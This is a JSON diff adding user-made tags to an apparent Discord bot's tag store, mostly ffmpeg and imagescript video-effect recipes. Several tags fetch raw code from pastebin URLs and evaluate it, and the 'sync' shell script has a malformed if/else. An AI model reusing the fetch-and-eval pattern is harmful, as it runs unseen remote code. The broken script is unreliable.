+    "updatedAt": "2026-06-13T19:08:42.277Z"
+  },
+  "um": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhflip i\ntvsim i 0.75\npitch=4;5;6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:10:12.239Z",
+    "updatedAt": "2026-06-13T19:10:12.239Z"
+  },
+  "umaj": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhflip i\ntvsim i 0.75\npitch=4;5;6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:10:28.636Z",
+    "updatedAt": "2026-06-13T19:10:28.636Z"
+  },
+  "umajor": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhflip i\ntvsim i 0.75\npitch=4;5;6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:10:31.250Z",
+    "updatedAt": "2026-06-13T19:10:31.250Z"
+  },
+  "u_major": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhflip i\ntvsim i 0.75\npitch=4;5;6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:10:34.713Z",
+    "updatedAt": "2026-06-13T19:10:34.713Z"
+  },
+  "gm28": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhflip i\ntvsim i 0.75\nvignette i 0.4\npitch=4;5;6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:12:45.511Z",
+    "updatedAt": "2026-06-13T19:12:45.511Z"
+  },
+  "gm29": {
+    "script": "{imagescript:\nload {iv} i\ngm4 i\nswapuv i\nhuehsv i -135\nsaturation i 2\npitch=5;7;9\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:15:57.807Z",
+    "updatedAt": "2026-06-13T19:15:57.807Z"
+  },
+  "gm30": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhuehsv i 100\nmirror i 270\nswirl i -150\nwave=8;0;2;0;31;31;1.5\npitch=0;-2.25\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:22:55.559Z",
+    "updatedAt": "2026-06-13T19:22:55.559Z"
+  },
+  "gm31": {
+    "script": "{ihtx:lut=https://files.catbox.moe/fviizz.cube ,pitch=2;6}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:28:26.615Z",
+    "updatedAt": "2026-06-19T07:02:05.297Z"
+  },
+  "gm32": {
+    "script": "{imagescript:\nload {iv} i\ntvsim i 0.45\nscroll=0;0.25\nwave=0;16;0;1;31;31\nswirl i 110\npitch=-8;-6;-3;0\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:36:21.820Z",
+    "updatedAt": "2026-06-13T19:36:21.820Z"
+  },
+  "graphingcalculator": {
+    "script": "wip",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-14T09:11:10.714Z",
+    "updatedAt": "2026-06-16T12:09:03.335Z"
+  },
+  "that": {
+    "script": "br",
+    "ownerId": "1498397524917096588",
+    "ownerUsername": "obltot671",
+    "createdAt": "2026-06-14T09:44:19.355Z",
+    "updatedAt": "2026-06-14T09:44:19.355Z"
+  },
+  "p1280ff!3": {
+    "script": "Use &sync to make it synced.\n{eval:{text:https://pastebin.com/raw/yT5nMc72}}",
+    "ownerId": "1470687815913443472",
+    "ownerUsername": "yodelaiihiiho",
+    "createdAt": "2026-06-14T09:53:54.102Z",
+    "updatedAt": "2026-06-14T09:53:54.102Z"
+  },
+  "icf++": {
+    "script": "{eval:{text:https://pastebin.com/raw/EVkpqpXw}}",
+    "ownerId": "1450462223599140967",
+    "ownerUsername": "nyx_purr",
+    "createdAt": "2026-06-14T09:57:45.273Z",
+    "updatedAt": "2026-06-14T09:57:45.273Z"
+  },
+  "p1280ff": {
+    "script": "hey you! use `.t sync+` to make it perfect.\n{eval:{text:https://pastebin.com/raw/WBfscKvj}}",
+    "ownerId": "1450462223599140967",
+    "ownerUsername": "nyx_purr",
+    "createdAt": "2026-06-14T10:01:55.563Z",
+    "updatedAt": "2026-06-14T10:01:55.563Z"
+  },
+  "wmm3drfc": {
+    "script": "{if:{arg:0}|=|help|then:{code:.t {tagname} <strength> <frequency> <speed> <?fade> <iterations>}|else:{set:code|{set:fadeRipple?|{js:let answer = `{or:{arg:3}|true}`;\nlet trueResponses = ['1','true','t','y','yes','+','on'];\nlet falseResponses = ['0','false','f','n','no','-','off'];\nif ((!((trueResponses.includes(answer)) || (falseResponses.includes(answer)))) && ({argslen} >= 5)) {\n     console.error(`Invalid argument. must be true or false`)\n}\nconsole.log(trueResponses.includes(answer.toLowerCase()))}}\n{set:c|scale=640:640,format=yuv444p,\"geq='p(mod(W*0.5+(hypot(X-W*0.5,Y-H*0.5)+{if:{get:fadeRipple?}|=|true|then:sin(N/$fc*PI)*}{or:{arg:0}|33}*sin(2*PI*N/$fc*{or:{arg:2}|2}-(0)+(-(hypot(X-W*0.5,Y-H*0.5))/{or:{arg:1}|90})))*cos(atan2(Y-H*0.5,X-W*0.5)),W),mod(H*0.5+(hypot(X-W*0.5,Y-H*0.5)-{if:{get:fadeRipple?}|=|true|then:sin(N/$fc*PI)*}{or:{arg:0}|33}*sin(2*PI*N/$fc*{or:{arg:2}|2}-(0)+(-(hypot(X-W*0.5,Y-H*0.5))/{or:{arg:1}|90})))*sin(atan2(Y-H*0.5,X-W*0.5)),H))'\",scale=$w:$h,setsar=1,format=yuv420p}\n{if:{or:{arg:4}|1}|>|6|then:{js:console.error(`Iterations must be between 1 and 6.`)}|else:{if:{or:{arg:4}|1}|<|1|then:{js:console.error(`Iterations must be between 1 and 6.`)}|else:{js:console.log(`-vf ${Array.from({ length: {or:{arg:4}|1} }, (_,i)=>discord.variables.c).join(`,`)}`)}}}}\n{code:{get:code}}\n{sh:\nload {iv}\n\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 $FILE_1)\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 $FILE_1)\n\nffmpeg -i $FILE_1 {get:code} ./output/wmm_3d_ripple.mp4}}",
+    "ownerId": "1450462223599140967",
+    "ownerUsername": "nyx_purr",
+    "createdAt": "2026-06-14T10:06:25.873Z",
+    "updatedAt": "2026-06-14T10:06:25.873Z"
+  },
+  "gm4_ihtx_ffmpeg": {
+    "script": "**Code created by Holly's Tag Code Creator,** `Only on Notsobot`\n\nthis is a test of my code creator, if anything is broken, ping me please {imagescript:\nload {iv} 0\nsnip 0 0 0.5\ncopy 0 1\nhuecurvergba 1 all 0 1 0\ncopy 1 1c\naudiopitch 1 1.335\noverlay 1 1c\nvolume 1 2\nrepeatduration 1 0d\nsnip 1 0 0d\ncopy 1 2\nhuecurvergba 2 all 0 1 0\ncopy 2 2c\naudiopitch 2 1.335\noverlay 2 2c\nvolume 2 2\nrepeatduration 2 0d\nsnip 2 0 0d\ncopy 2 3\nhuecurvergba 3 all 0 1 0\ncopy 3 3c\naudiopitch 3 1.335\noverlay 3 3c\nvolume 3 2\nrepeatduration 3 0d\nsnip 3 0 0d\ncopy 3 4\nhuecurvergba 4 all 0 1 0\ncopy 4 4c\naudiopitch 4 1.335\noverlay 4 4c\nvolume 4 2\nrepeatduration 4 0d\nsnip 4 0 0d\ncopy 4 5\nhuecurvergba 5 all 0 1 0\ncopy 5 5c\naudiopitch 5 1.335\noverlay 5 5c\nvolume 5 2\nrepeatduration 5 0d\nsnip 5 0 0d\ncopy 5 6\nhuecurvergba 6 all 0 1 0\ncopy 6 6c\naudiopitch 6 1.335\noverlay 6 6c\nvolume 6 2\nrepeatduration 6 0d\nsnip 6 0 0d\ncopy 6 7\nhuecurvergba 7 all 0 1 0\ncopy 7 7c\naudiopitch 7 1.335\noverlay 7 7c\nvolume 7 2\nrepeatduration 7 0d\nsnip 7 0 0d\ncopy 7 8\nhuecurvergba 8 all 0 1 0\ncopy 8 8c\naudiopitch 8 1.335\noverlay 8 8c\nvolume 8 2\nrepeatduration 8 0d\nsnip 8 0 0d\ncopy 8 9\nhuecurvergba 9 all 0 1 0\ncopy 9 9c\naudiopitch 9 1.335\noverlay 9 9c\nvolume 9 2\nrepeatduration 9 0d\nsnip 9 0 0d\ncopy 9 10\nhuecurvergba 10 all 0 1 0\ncopy 10 10c\naudiopitch 10 1.335\noverlay 10 10c\nvolume 10 2\nrepeatduration 10 0d\nsnip 10 0 0d\ncopy 10 11\nconcat 1 2\nconcat 1 3\nconcat 1 4\nconcat 1 5\nconcat 1 6\nconcat 1 7\nconcat 1 8\nconcat 1 9\nconcat 1 10\n}",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-14T10:17:42.586Z",
+    "updatedAt": "2026-06-14T10:17:42.586Z"
+  },
+  "gm33": {
+    "script": "{imagescript:\nload {iv} i\ntvsim i 0.66\nlut=https://files.catbox.moe/0pc0ls.cube\nscroll=0;0.015\npitch=-7;0;4.5;8.67\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T10:28:59.192Z",
+    "updatedAt": "2026-06-18T10:13:35.863Z"
+  },
+  "gm34": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i -90\nwave=8;0;2;0;31;31;1.5\nfisheye i 1\ninvert i\npixelate i 10\npitch=-4.5;0;5\naudioequalizer=-30;0;10;15;40\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T10:50:51.824Z",
+    "updatedAt": "2026-06-14T10:50:51.824Z"
+  },
+  "gm35": {
+    "script": "{imagescript:\nload {iv} i\ntvsim i 0.66\nscroll=0;0.015\nlut=https://files.catbox.moe/p6ia8z.cube\npitch=-10;-5;0;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T10:59:25.558Z",
+    "updatedAt": "2026-06-14T10:59:25.558Z"
+  },
+  "gm36": {
+    "script": "{imagescript:\nload {iv} i\ntvsim i 0.85\ngradientmap=[[183,125,0,255],[90,56,0,255],[200,200,200,255]]\npitch=-8;-3;0;2;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:06:30.152Z",
+    "updatedAt": "2026-06-18T10:14:54.839Z"
+  },
+  "gm36v2": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhuehsv i 180\nhue i 180\nfisheye=-2;0.36;0.36;0.5\nmirror i 90\npitch=-10;0;10\naudioequalizer=-40;20;0;0;0\nacontrast=100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:17:30.774Z",
+    "updatedAt": "2026-06-14T11:23:10.815Z"
+  },
+  "gm36_v2": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhuehsv i 180\nhue i 180\nfisheye=-2;0.36;0.36;0.5\nmirror i 90\npitch=-10;0;10\naudioequalizer=-40;20;0;0;0\nacontrast=100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:17:46.000Z",
+    "updatedAt": "2026-06-14T11:23:13.289Z"
+  },
+  "gm7869": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhue i 180\nswapuv i\nfisheye=-2;0.36;0.36;0.5\nmirror i 90\npitch=-4;-2\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:24:17.029Z",
+    "updatedAt": "2026-06-14T11:24:17.029Z"
+  },
+  "gm74new": {
+    "script": "{imagescript:\nload {iv} i\ninvlum i\nfisheye i 1\naudiopitch=-10;9;14\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:28:05.155Z",
+    "updatedAt": "2026-06-14T11:28:05.155Z"
+  },
+  "gm400": {
+    "script": "{imagescript:\nload {iv} i\nrotate=90\ntvsim i 0.75\nrotate=-90\nzoom=1.5\nchannelblend=r;b;g\npitch=-5;1\n}",
+    "ownerId": "1221656858612203581",
+    "ownerUsername": "gucci_17__75369",
+    "createdAt": "2026-06-14T11:28:19.275Z",
+    "updatedAt": "2026-06-14T11:28:19.275Z"
+  },
+  "gm87new": {
+    "script": "unfortunately, this is the unoriginal version of g major 87 since its an combination of 2 existing effects\nfor the original version, use \"&t gm87og\" for it. {imagescript:\nload {iv} i\ninvlum i\nfisheye i 1\naudiopitch=-10;9;14\nswapuv i\nsaturation i 1.5\ngm4 i\npitch=0;3;6;9;12\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:30:38.986Z",
+    "updatedAt": "2026-06-14T11:30:38.986Z"
+  },
+  "ns_tvsim": {
+    "script": "{imagescript:\nload {iv} i\nflop i\nhaah i\ntvsim i 0.75\nhuehsv i 180\npitch=-2\n}",
+    "ownerId": "1221656858612203581",
+    "ownerUsername": "gucci_17__75369",
+    "createdAt": "2026-06-14T11:31:17.311Z",
+    "updatedAt": "2026-06-14T11:31:17.311Z"
+  },
+  "gm87og": {
+    "script": "this is kurash's version of the original g major 87\nuse \"&t gm87og2\" for another version of the original g major 87 {imagescript:\nload {iv} i\ninvlum i\nswapuv i\nhue i -15\nmirror=90\npitch=-5;0;4;5;10;14\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:35:13.931Z",
+    "updatedAt": "2026-06-14T11:35:13.931Z"
+  },
+  "amtve": {
+    "script": "{iv}",
+    "ownerId": "1056191069206876161",
+    "ownerUsername": "amtve",
+    "createdAt": "2026-06-14T11:36:24.938Z",
+    "updatedAt": "2026-06-14T11:37:15.298Z"
+  },
+  "edit": {
+    "script": "use &t add",
+    "ownerId": "1056191069206876161",
+    "ownerUsername": "amtve",
+    "createdAt": "2026-06-14T11:36:53.584Z",
+    "updatedAt": "2026-06-14T11:36:53.584Z"
+  },
+  "gm87og2": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 45\nfisheye=-0.5\npitch=3.6;-8.1\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:38:24.298Z",
+    "updatedAt": "2026-06-14T11:38:24.298Z"
+  },
+  "gm37": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\npitch=11.53\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-14T11:40:01.990Z",
+    "updatedAt": "2026-06-14T11:40:01.990Z"
+  },
+  "raw": {
+    "script": "use &t info",
+    "ownerId": "1056191069206876161",
+    "ownerUsername": "amtve",
+    "createdAt": "2026-06-14T11:43:21.328Z",
+    "updatedAt": "2026-06-14T11:43:21.328Z"
+  },
+  "url2": {
+    "script": "{iv}",
+    "ownerId": "1503126727512297522",
+    "ownerUsername": "masonsab.125",
+    "createdAt": "2026-06-14T11:43:58.882Z",
+    "updatedAt": "2026-06-14T11:43:58.882Z"
+  },
+  "sync": {
+    "script": "{sh:load {iv}\n\nffmpeg -i $FILE_1 -an v.mp4\nffmpeg -i $FILE_1 a.wav\n\nvd=$(ffprobe -i v.mp4 -select_streams v:0 -show_entries format=duration -v quiet -of csv=\"p=0\")\nad=$(ffprobe -i a.wav -select_streams a:0 -show_entries format=duration -v quiet -of csv=\"p=0\")\nfr=$(ffprobe -v error -select_streams v:0 -show_entries stream=r_frame_rate -of default=nokey=1:noprint_wrappers=1 $FILE_1)\n\n    ffmpeg -i v.mp4 -stream_loop -1 -i a.wav -af \"atempo=$ad/$vd\" -map 0:v -map 1:a -t $vd ./output/whar.mp4\n\n    rm -f v.mp4 a.wav\n\n    diff=$(echo \"scale=6; $vd-$ad\" | bc)\n    speed=$(echo \"scale=6; $ad/$vd\" | bc)\n\n    echo \"Video: $vd\nAudio: $ad\n\nSpeed Used: $speed\nDiff: $diff\"\nelse \n    ffmpeg -i v.mp4 -stream_loop -1 -i a.wav -vf \"setpts=1/($vd/$ad)*PTS\",fps=$fr -map 0:v -map 1:a -t $vd ./output/whar.mp4\n\n    rm -f v.mp4 a.wav\n\n    diff=$(echo \"scale=6; $vd-$ad\" | bc)\n    speed=$(echo \"scale=6; $vd/$ad\" | bc)\n\n    echo \"Video: $vd\nAudio: $ad\n\nSpeed Used: $speed\nDiff: $diff\"\nfi}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-14T17:08:22.422Z",
+    "updatedAt": "2026-06-21T16:04:30.830Z"
+  },
+  "cute": {
+    "script": "{imagescript:\nload {iv} i\nchannelblend=b;r;g\nfisheye=2\nfisheye=-2\npitch=4}",
+    "ownerId": "1221656858612203581",
+    "ownerUsername": "gucci_17__75369",
+    "createdAt": "2026-06-14T18:45:16.521Z",
+    "updatedAt": "2026-06-14T18:45:16.521Z"
+  },
+  "gm137": {
+    "script": "{imagescript:\nload {iv} i\ninvlum i\nswapuv i\nfisheye i 1\naudiopitch=-10;9;14\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T06:02:29.083Z",
+    "updatedAt": "2026-06-15T06:02:29.083Z"
+  },
+  "gm9869": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\nhuehsv i 100\ninvlum i\nfisheye i 1\naudiopitch i -13 9 16\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T06:06:13.824Z",
+    "updatedAt": "2026-06-15T06:06:13.824Z"
+  },
+  "ks+": {
+    "script": "{attach:https://files.catbox.moe/k80929.mp4 }",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T06:07:24.058Z",
+    "updatedAt": "2026-06-15T12:04:09.186Z"
+  },
+  "ihtx2": {
+    "script": "{ihtx:{arg:2}|{arg:0}|{arg:1}}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T06:16:05.242Z",
+    "updatedAt": "2026-06-15T06:16:56.325Z"
+  },
+  "gm38": {
+    "script": "{imagescript:\nload {iv} i\nlut=https://files.catbox.moe/0rgem7.cube\nscroll=0;0.0125\nswirl i 150 0.5 0.25\npitch i 0 2 4 6 9 12 16\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T07:13:14.161Z",
+    "updatedAt": "2026-06-15T07:13:14.161Z"
+  },
+  "gm54": {
+    "script": "{imagescript:\nload {iv} i\nlut=https://files.catbox.moe/r40bui.cube\npitch i 5 10 14\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T07:21:52.802Z",
+    "updatedAt": "2026-06-15T07:21:52.802Z"
+  },
+  "testc": {
+    "script": "{tag:testcode}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T07:24:28.431Z",
+    "updatedAt": "2026-06-15T07:24:28.431Z"
+  },
+  "gm39": {
+    "script": "{imagescript:\nload {iv} i\nlut=https://files.catbox.moe/r40bui.cube\ntvsim i 0.75\nrays i 2\npitch i -9 -2 3 7 10 15 -3 4 9 13 16 21\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T07:26:37.371Z",
+    "updatedAt": "2026-06-15T07:28:36.534Z"
+  },
+  "oldschool": {
+    "script": "{ihtx:invlum,swirl=((T*2000)/vd)-1000,autotune=https://files.catbox.moe/dn6f0m.mp4 }",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T07:48:47.237Z",
+    "updatedAt": "2026-06-15T11:29:41.966Z"
+  },
+  "url": {
+    "script": "{iv}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T08:16:55.664Z",
+    "updatedAt": "2026-06-15T08:16:55.664Z"
+  },
+  "audio2image": {
+    "script": "{sh:\nload {av}\n\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\nd2=$(awk -v d=\"$d\" 'BEGIN{print int(d*100/2)*2}')\n\nffmpeg -i $FILE_1 -filter_complex \"[0:a]showcqt=size=570x${d2}:basefreq=27.5:endfreq=20000:bar_h=0:axis_h=0:count=4:cscheme='.5|.5|.5|.5|.5|.5',reverse,transpose=3[v]\" -map [v] -frames:v 1 ./output/showcqt.png}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T09:49:37.487Z",
+    "updatedAt": "2026-06-15T10:31:01.163Z"
+  },
+  "a2i": {
+    "script": "{tag:audio2image}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T10:31:33.440Z",
+    "updatedAt": "2026-06-15T10:31:33.440Z"
+  },
+  "upsidedown": {
+    "script": "{sh:\nload {iv} \n\nffmpeg -i $FILE_1 -vf vflip -af aresample=44100,rubberband=tempo=0.05:smoothing=712923000:window=long,\"afftfilt=real='real((1216000/b),ch)':imag='imag((1216000/b),ch)':overlap=1:win_size=65536:win_func=bharris\",rubberband=tempo=20:smoothing=712923000:window=long,volume=8 -ac 1 ./output/udea.mp4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T11:04:09.492Z",
+    "updatedAt": "2026-06-15T11:04:35.681Z"
+  },
+  "ude": {
+    "script": "{tag:upsidedown}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T11:05:08.721Z",
+    "updatedAt": "2026-06-15T11:05:08.721Z"
+  },
+  "rotationwave": {
+    "script": "{ihtx:spin=1/vd,wave=3;0;3;0;31;31,pitch=-4}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T12:03:24.342Z",
+    "updatedAt": "2026-06-15T12:06:47.117Z"
+  },
+  "old_school": {
+    "script": "{tag:oldschool}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T12:03:33.966Z",
+    "updatedAt": "2026-06-15T12:03:33.966Z"
+  },
+  "rotation_wave": {
+    "script": "{tag:rotationwave}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T12:03:42.257Z",
+    "updatedAt": "2026-06-15T12:03:42.257Z"
+  },
+  "image2audio": {
+    "script": "{sh:\nload {iv}\n\nffmpeg -i \"$FILE_1\" -f rawvideo - | ffmpeg -f s16le -sample_rate 44100 -channels 1 -i - output.wav\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T12:37:58.623Z",
+    "updatedAt": "2026-06-15T17:56:56.404Z"
+  },
+  "i2a": {
+    "script": "{tag:image2audio}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-15T12:44:23.975Z",
+    "updatedAt": "2026-06-15T12:44:23.975Z"
+  },
+  "fdm": {
+    "script": "{ihtx:mirror=270,huehsv=180,pitch=-6}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T12:45:45.974Z",
+    "updatedAt": "2026-06-15T12:45:45.974Z"
+  },
+  "fielddaymajor": {
+    "script": "{tag:fdm}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T12:46:37.525Z",
+    "updatedAt": "2026-06-15T12:46:37.525Z"
+  },
+  "field_day_major": {
+    "script": "{tag:fdm}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T12:46:42.260Z",
+    "updatedAt": "2026-06-15T12:46:42.260Z"
+  },
+  "gm40": {
+    "script": "{ihtx:invlum,swirl=((T*2000)/vd)-1000,mirror=270,huehsv=180,autotune=https://files.catbox.moe/xvx4gj.mp4 }",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T12:48:46.163Z",
+    "updatedAt": "2026-06-15T12:55:18.193Z"
+  },
+  "gm41": {
+    "script": "{ihtx:invert,huehsv=-45,mirror=180,mirror=270,swirl=50,pitch=-4.5;0;5}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T12:58:02.485Z",
+    "updatedAt": "2026-06-15T12:58:02.485Z"
+  },
+  "gm42": {
+    "script": "{ihtx:swapuv,invlum,huehsv=180,pitch=-3;0;4;7}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:13:15.815Z",
+    "updatedAt": "2026-06-15T13:13:15.815Z"
+  },
+  "crying-v2": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhuehsv i -135\nwave i 0 8 0 2 31 31\npitch 0 -5\n}",
+    "ownerId": "1501331770719731792",
+    "ownerUsername": "jtvpavsvmve2k26slogoediting",
+    "createdAt": "2026-06-15T13:23:15.368Z",
+    "updatedAt": "2026-06-15T13:23:15.368Z"
+  },
+  "evenxdiscontinues": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i -45\nswirl i 500\ntvsim i 0.75\nswirl i -500\npitch=-7.5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:37:10.613Z",
+    "updatedAt": "2026-06-15T13:37:10.613Z"
+  },
+  "even_x_discontinues": {
+    "script": "{tag:evenxdiscontinues}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:38:46.495Z",
+    "updatedAt": "2026-06-15T13:38:46.495Z"
+  },
+  "evendiscontinues": {
+    "script": "{tag:evenxdiscontinues}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:38:50.220Z",
+    "updatedAt": "2026-06-15T13:38:50.220Z"
+  },
+  "even_discontinues": {
+    "script": "{tag:evenxdiscontinues}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:38:52.258Z",
+    "updatedAt": "2026-06-15T13:38:52.258Z"
+  },
+  "discontinues": {
+    "script": "{tag:evenxdiscontinues}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:38:55.563Z",
+    "updatedAt": "2026-06-15T13:38:55.563Z"
+  },
+  "evenxcontinues": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 45\nswirl i -500\ntvsim i 0.75\nswirl i 500\npitch=7.5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:39:41.842Z",
+    "updatedAt": "2026-06-15T13:39:41.842Z"
+  },
+  "even_x_continues": {
+    "script": "{tag:evenxcontinues}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:40:04.770Z",
+    "updatedAt": "2026-06-15T13:40:04.770Z"
+  },
+  "evencontinues": {
+    "script": "{tag:evenxcontinues}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:40:08.099Z",
+    "updatedAt": "2026-06-15T13:40:08.099Z"
+  },
+  "even_continues": {
+    "script": "{tag:evenxcontinues}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:40:10.068Z",
+    "updatedAt": "2026-06-15T13:40:10.068Z"
+  },
+  "continues": {
+    "script": "{tag:evenxcontinues}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:40:14.365Z",
+    "updatedAt": "2026-06-15T13:40:14.365Z"
+  },
+  "gm44": {
+    "script": "{ihtx:invlum,swirl=((T*2000)/vd)-1000,autotune=https://files.catbox.moe/mtnf3q.mp4 ,huehsv=-45,swirl=500,tvsim=0.75,swirl=-500}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T13:52:57.513Z",
+    "updatedAt": "2026-06-15T13:52:57.513Z"
+  },
+  "gm45": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i -45\ninvert i\ngm4 i\npitch=2;6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:00:12.456Z",
+    "updatedAt": "2026-06-15T14:00:12.456Z"
+  },
+  "gm46": {
+    "script": "{ihtx:huehsv=72,invert,mirror=90,wave=0;8;0;2;31;31;6,pitch=10}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-15T14:02:46.480Z",
+    "updatedAt": "2026-06-15T14:02:46.480Z"
+  },
